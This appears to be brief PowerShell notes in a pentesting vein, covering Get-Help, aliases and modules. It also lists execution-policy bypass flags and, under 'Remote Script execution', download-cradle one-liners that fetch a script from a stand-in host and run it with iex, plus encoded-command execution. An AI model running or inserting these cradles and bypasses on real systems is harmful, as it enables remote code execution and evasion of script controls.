# Help System
`Get-Help Get-Process`
`help Get-Process`
`Update-Help`

`Get-Help remoting`
`Get-Help about_*remot*`

`Get-Command -CommandTyle Cmdlet`

# Basic Constructs

Cmdlets
Function

# Aliases

`Get-Alias -Name ps`
`Get-Alias -Definition Get-Process`

# Execution Policy

* Not a security feature
* Used to avoid accidental script execution
* Can be bypass with:
  * `powershell -executionpolicy bypass .\example.ps1`
  * `powershell -c <cmd>`
  * `powershell -enc`

# Modules

`Import-Module <path_to_module> -verbose`
`Get-Command -Module <module_name>`

# Remote Script execution

* `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
* `iex (New-Object Net.WebClient).DownloadString('http://example.com/example.ps1');`
* `powershell -EncodedCommand <Base64EncodedCommand>`

* Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter
